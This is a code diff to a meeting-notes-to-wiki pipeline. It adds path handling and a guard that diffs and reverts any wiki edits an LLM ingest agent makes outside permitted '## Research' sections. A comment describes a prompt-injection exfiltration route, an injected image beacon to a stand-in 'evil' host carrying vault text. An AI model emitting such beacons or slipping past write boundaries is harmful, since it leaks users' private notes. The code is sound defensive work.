@@ -16,6 +16,7 @@ Flags: --hours N (default 26) | --since YYYY-MM-DD (backfill) | --no-monday | --
 """
 
 import argparse
+import difflib
 import hashlib
 import json
 import os
@@ -142,15 +143,29 @@ def slugify(title, max_len=50):
     return slug[:max_len].rstrip("-") or "untitled"
 
 
+def raw_files():
+    """Every .md under wiki/raw/, nested folders included, hidden folders skipped."""
+    return sorted(f for f in RAW.rglob("*.md") if not any(p.startswith(".") for p in f.relative_to(RAW).parts))
+
+
+def source_name(path):
+    """What state calls a swept file: its path relative to wiki/raw/ for raw files (two
+    folders can hold a b.md), else the bare name, so research memos keep their old keys."""
+    try:
+        return path.resolve().relative_to(RAW.resolve()).as_posix()
+    except ValueError:
+        return path.name
+
+
 def source_key(path):
     """State-file entry for a swept file: name + short content hash, so edits re-ingest."""
-    return f"{path.name}:{hashlib.sha256(path.read_bytes()).hexdigest()[:16]}"
+    return f"{source_name(path)}:{hashlib.sha256(path.read_bytes()).hexdigest()[:16]}"
 
 
 def source_is_pending(path, ingested):
-    # ponytail: bare filename entries are legacy (pre-hash) marks and match regardless of
+    # ponytail: bare name entries are legacy (pre-hash) marks and match regardless of
     # content hash, so already-tracked raw files don't spuriously re-ingest on this upgrade.
-    return path.name not in ingested and source_key(path) not in ingested
+    return source_name(path) not in ingested and source_key(path) not in ingested
 
 
 def pending_research(state):
@@ -239,10 +254,20 @@ def fetch_meetings(created_after, created_before):
     return meetings
 
 
-def write_note(m):
+def note_path(m, state=None):
+    """meetings/{date}-{slug}.md, or {date}-{slug}-{id6}.md when state says another meeting
+    already owns that name (same title, same day)."""
+    path = MEETINGS / f"{m['dt'].strftime('%Y-%m-%d')}-{slugify(m['title'])}.md"
+    rel = path.relative_to(VAULT)
+    if any(i != m["id"] and Path(e["note"]) == rel for i, e in ((state or {}).get("meetings") or {}).items()):
+        path = path.with_name(f"{path.stem}-{m['id'][:6]}.md")
+    return path
+
+
+def write_note(m, state=None):
     """Write meetings/{date}-{slug}.md per the /today template. Returns relative path or None if it exists."""
     date_str = m["dt"].strftime("%Y-%m-%d")
-    path = MEETINGS / f"{date_str}-{slugify(m['title'])}.md"
+    path = note_path(m, state)
     if path.exists():
         return None
     mine = [a for a in m["action_items"] if a["is_mine"]]
@@ -300,7 +325,7 @@ def _today_skeleton(date_str, dt_local):
         "tags:\n  - daily\n"
         "generated-skeleton: fathom-pipeline\n"
         "---\n"
-        f"# {dt_local.strftime('%A, %B %-d, %Y')}\n\n"
+        f"# {dt_local.strftime('%A, %B')} {dt_local.day}, {dt_local.year}\n\n"  # no %-d: the Windows CRT rejects it
         "*(Skeleton from the Fathom pipeline — run /today for the full worksheet. "
         "The Meeting Digest below grows with each hourly sweep.)*\n\n"
         f"{DIGEST_START}\n"
@@ -438,6 +463,93 @@ def verify_ingest(source_paths):
     return True, None
 
 
+# ── Research write boundary ─────────────────────────────────
+# RESEARCH_EXTRA is prompt text; nothing in the guard limits a Write to one section. So the
+# sweep snapshots the wiki, runs the batch, and diffs: a run that did more than add lines under
+# `## Research` on pages its memos name (plus a log.md append) is reverted.
+
+def wiki_snapshot():
+    return {f: f.read_bytes() for f in (VAULT / "wiki").rglob("*.md")}
+
+
+def memo_targets(memo):
+    """Lowercased names in a memo's `project:` and `tags:` frontmatter; a page whose stem
+    matches one is a page the memo names."""
+    fm = re.match(r"---\n(.*?)\n---", memo.read_text(errors="ignore"), re.S)
+    names = []
+    for line in (fm.group(1).splitlines() if fm else []):
+        key, _, val = line.partition(":")
+        if key.strip() in ("project", "tags"):
+            names += val.strip("[] ").split(",")
+        elif line.lstrip().startswith("- "):
+            names.append(line.lstrip()[2:])  # a block-list item; stems that match nothing change nothing
+    return {n.strip().strip("'\"[]").lower() for n in names if n.strip()}
+
+
+def research_edit_ok(old, new, limit):
+    """True when new is old plus at most `limit` added lines, all under `## Research` (the heading
+    itself is free). A `generated:` stamp is ignored: the batch prompt asks for one."""
+    strip = lambda t: [l for l in t.splitlines() if not l.startswith("generated:")]
+    a, b = strip(old), strip(new)
+    section, under = None, []
+    for l in b:
+        if l.startswith("#"):
+            section = l.strip()
+        under.append(section)
+    added = 0
+    for op, i1, i2, j1, j2 in difflib.SequenceMatcher(None, a, b, autojunk=False).get_opcodes():
+        if op in ("replace", "delete"):
+            return False
+        for j in range(j1, j2) if op == "insert" else ():
+            if b[j].strip() and b[j].strip() != "## Research":
+                if under[j] != "## Research":
+                    return False
+                added += 1
+    return added <= limit
+
+
+def research_violations(before, memos):
+    """What a research batch changed beyond its boundary, as short strings; empty when clean."""
+    after = wiki_snapshot()
+    memo_files = {(VAULT / m).resolve() for m in memos}
+    wanted = {n for m in memo_files for n in memo_targets(m)}
+    out = []
+    for f in sorted(set(before) | set(after)):
+        rel = f.relative_to(VAULT).as_posix()
+        if f == WIKI_LOG:
+            if f in before and not (f in after and after[f].startswith(before[f])):
+                out.append(f"{rel} rewritten, not appended")
+        elif f not in before:
+            out.append(f"{rel} created")
+        elif f not in after:
+            out.append(f"{rel} deleted")
+        elif before[f] != after[f]:
+            if f.resolve() in memo_files or f.stem.lower() not in wanted:
+                out.append(f"{rel} changed")
+            elif not research_edit_ok(before[f].decode(errors="replace"), after[f].decode(errors="replace"), len(memos)):
+                out.append(f"{rel} changed beyond lines under ## Research")
+    return out
+
+
+def ingest_research(batch, extra=""):
+    """ingest_to_wiki for research memos, reverting the wiki when the run left its boundary.
+    A violation counts as a failed source, so the memo stays pending."""
+    before = wiki_snapshot()
+    ok = ingest_to_wiki(batch, extra)
+    bad = research_violations(before, batch)
+    if bad:
+        log(f"  research write boundary violated, reverting: {bad}")
+        for f in wiki_snapshot():
+            if f not in before:
+                f.unlink()
+        for f, data in before.items():
+            if not f.exists() or f.read_bytes() != data:
+                f.parent.mkdir(parents=True, exist_ok=True)
+                f.write_bytes(data)
+        return False
+    return ok
+
+
 # A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
 # ![](https://evil/?d=<vault text>) would ship whatever the child read. URLs can be spelled too
 # many ways to match, so the rule is syntax: any raw HTML tag, any image that isn't a well-formed
@@ -526,7 +638,8 @@ def guard_settings():
 
     The child's tools reach any path on disk, and the summaries it ingests are LLM output
     from whatever was said in a meeting. Confine every path-carrying tool to the vault and
-    the wiki skill the prompt tells it to read, and Write/Edit to VAULT/wiki (the guard's
+    the wiki skill the prompt tells it to read (Glob and Grep may target the skill root too, since
+    it holds no dot folders), and Write/Edit to VAULT/wiki (the guard's
     argument). See scripts/ingest-path-guard.py.
 
     Split out of ingest_to_wiki so the control itself is testable without running an ingest.
@@ -699,7 +812,7 @@ def main():
         for m in new:
             mine = sum(1 for a in m["action_items"] if a["is_mine"] and not a["completed"])
             log(f"  would process: {m['dt'].strftime('%Y-%m-%d')} {m['title']} ({mine} of my action items)")
-        pending_raw = [f.name for f in sorted(RAW.glob("*.md")) if source_is_pending(f, state["raw_ingested"])]
+        pending_raw = [source_name(f) for f in raw_files() if source_is_pending(f, state["raw_ingested"])]
         log(f"  would ingest raw/: {pending_raw}")
         log(f"  would sweep research/: {[f.name for f in pending_research(state)]}")
         return
@@ -713,9 +826,9 @@ def main():
     monday_broken = False  # a Monday outage must never block wiki ingest
     digest_entries = []
     for m in new:
-        note_rel = write_note(m)
+        note_rel = write_note(m, state)
         if note_rel is None:
-            note_rel = f"wiki/meetings/{m['dt'].strftime('%Y-%m-%d')}-{slugify(m['title'])}.md"
+            note_rel = note_path(m, state).relative_to(VAULT).as_posix()
             log(f"  note exists, skipping write: {note_rel}")
         else:
             log(f"  wrote {note_rel}")
@@ -742,8 +855,8 @@ def main():
         failures = state.setdefault("ingest_failures", {})  # source path -> consecutive failure count
         state.setdefault("research_ingested", [])
         pending_notes = [(mid, e) for mid, e in state["meetings"].items() if not e["ingested"]]
-        pending_raw = [f for f in sorted(RAW.glob("*.md")) if source_is_pending(f, state["raw_ingested"])]
-        sources = [e["note"] for _, e in pending_notes] + [f"wiki/raw/{f.name}" for f in pending_raw]
+        pending_raw = [f for f in raw_files() if source_is_pending(f, state["raw_ingested"])]
+        sources = [e["note"] for _, e in pending_notes] + [f"wiki/raw/{source_name(f)}" for f in pending_raw]
         research = [f"wiki/pages/research/{f.name}" for f in pending_research(state)]
         quarantined = [s for s in sources + research if failures.get(s, 0) >= 2]
         if quarantined:
@@ -764,12 +877,12 @@ def main():
                         tracked.append(key)
             failures.pop(s, None)
 
-        def run_batches(srcs, extra=""):
+        def run_batches(srcs, extra="", ingest=ingest_to_wiki):
             """Ingest srcs in batches of INGEST_BATCH. False when one whole batch failed
             source by source, which reads as systemic: a further batch only burns tokens."""
             for i in range(0, len(srcs), INGEST_BATCH):
                 batch = srcs[i:i + INGEST_BATCH]
-                ok = ingest_to_wiki(batch, extra)
+                ok = ingest(batch, extra)
                 if ok is None:
                     notify("wiki ingest can't authenticate; run scripts/setup-server.py --reauth. Stopping this run.")
                     return False
@@ -782,7 +895,7 @@ def main():
                 log("  batch failed; retrying sources individually")
                 any_ok = False
                 for s in batch:
-                    ok = ingest_to_wiki([s], extra)
+                    ok = ingest([s], extra)
                     if ok is None:
                         notify("wiki ingest can't authenticate; run scripts/setup-server.py --reauth. Stopping this run.")
                         save_state(state)
@@ -804,7 +917,7 @@ def main():
         # Research memos sweep separately, under RESEARCH_EXTRA's narrower write boundary.
         swept = run_batches(sources)
         if swept and research:
-            swept = run_batches(research, RESEARCH_EXTRA)
+            swept = run_batches(research, RESEARCH_EXTRA, ingest_research)
 
         # Index is derived from page frontmatter; regenerate deterministically after ingest
         # rather than trusting the headless agent to hand-edit a contended catalog file.
